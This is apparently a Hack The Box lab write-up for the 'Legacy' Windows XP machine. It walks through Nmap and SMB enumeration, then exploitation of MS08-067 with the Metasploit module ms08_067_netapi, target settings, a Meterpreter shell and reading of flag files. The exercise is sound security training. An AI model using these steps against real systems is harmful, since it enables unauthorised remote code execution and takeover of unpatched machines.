![](Images/Pasted%20image%2020260815211144.png)

**Platform:** Hack The Box  
**Difficulty:** Easy  
**OS:** Windows XP  
**Target IP:** `10.129.227.181`
## Overview

Legacy is a Windows XP machine that can be compromised through an outdated SMB service. Initial enumeration identified SMB running on TCP/445 and revealed that the target was running Windows XP with SMBv1 enabled.

Further enumeration identified the **MS08-067 / NetAPI** vulnerability, which allows remote code execution through the Windows Server Service. Exploitation with Metasploit provided a Meterpreter session with administrative privileges, allowing retrieval of both the user and root flags.

### Attack Path

```
Nmap
  ↓
SMB Enumeration
  ↓
Windows XP / SMBv1 Identified
  ↓
MS08-067 / NetAPI
  ↓
Metasploit
  ↓
Meterpreter Session
  ↓
User Flag
  ↓
Administrator / Root Flag
```

### 1. Reconnaissance

I started with an Nmap scan to identify open ports and running services.
![](Images/Pasted%20image%2020260815211207.png)

The scan identified three open TCP ports:

| Port    | Service     | Version                       |
| ------- | ----------- | ----------------------------- |
| 135/tcp | MSRPC       | Microsoft Windows RPC         |
| 139/tcp | NetBIOS-SSN | Microsoft Windows netbios-ssn |
| 445/tcp | SMB         | Microsoft-DS                  |

The service detection also identified the operating system as **Windows XP**.

The combination of **Windows XP** and an exposed SMB service immediately made SMB enumeration a priority.

### 2. SMB Enumeration

I used Nmap's SMB enumeration scripts to gather additional information about the target.

![](Images/Pasted%20image%2020260815212806.png)

The results confirmed:

- OS: **Windows XP**
- Computer name: **LEGACY**
- NetBIOS name: **LEGACY**
- Workgroup: **HTB**

The target was therefore confirmed to be an outdated Windows XP system.
#### SMB Protocol Enumeration 
 
I then checked which SMB protocols were supported:

![](Images/Pasted%20image%2020260815212931.png)

The target supported:

```
NT LM 0.12 (SMBv1)
```

SMBv1 is an obsolete protocol with a history of serious vulnerabilities. Combined with the Windows XP operating system and an exposed SMB service, this provided a strong indication that the service should be investigated for known vulnerabilities.

## 3. Vulnerability Identification

I used SearchSploit to search Exploit-DB for known vulnerabilities affecting the identified Windows XP configuration.

The search identified:

```
MS08-067 / NetAPI
```

MS08-067 is a remote code execution vulnerability affecting the Windows Server Service. Under vulnerable configurations, an attacker can execute arbitrary code remotely without valid credentials.

![](Images/Pasted%20image%2020260815214410.png)


The Metasploit module was identified as:

```
exploit/windows/smb/ms08_067_netapi
```

The vulnerability matched the target's Windows XP configuration, making it the primary exploitation path.

## 4. Exploitation

I used Metasploit to test and exploit the identified MS08-067 vulnerability.

```
msfconsole
```

I selected the corresponding exploit:

```
use exploit/windows/smb/ms08_067_netapi
```

The target and local VPN interface were configured as:

```
RHOST = 10.129.227.181
LHOST = 10.10.15.52
```

I initially allowed Metasploit to automatically identify the appropriate Windows target rather than manually specifying the Windows XP version.

The exploit completed successfully and established a Meterpreter session on the target.

```
Meterpreter session opened
```

I then dropped into a Windows shell to interact directly with the compromised system.

```
shell
```

The shell confirmed that the target was running:

```
Microsoft Windows XP [Version 5.1.2600]
```

At this point, remote code execution had been successfully achieved.

![](Images/Pasted%20image%2020260815215911.png)

## 5. User flag

With access to the machine, I began enumerating the Windows filesystem.

Because the target was running Windows XP, user profiles were located under:

```
C:\Documents and Settings
```

I enumerated the available user directories and identified the `john` user.

The user flag was located on John's Desktop:

```
C:\Documents and Settings\john\Desktop
```

I listed the directory contents and retrieved `user.txt`:

```
dir
type user.txt
```

This confirmed successful access to the user-level flag.

![](Images/Pasted%20image%2020260815220002.png)

## 6. Root flag

The successful MS08-067 exploitation provided administrative-level access to the machine.

I navigated to the Administrator profile:

```
C:\Documents and Settings\Administrator
```

and then to the Administrator's Desktop:

```
C:\Documents and Settings\Administrator\Desktop
```

The directory contained `root.txt`.

```
dir
```

The flag was then retrieved from the file.

![](Images/Pasted%20image%2020260815215852.png)

This confirmed that the machine had been fully compromised and that administrative access had been obtained.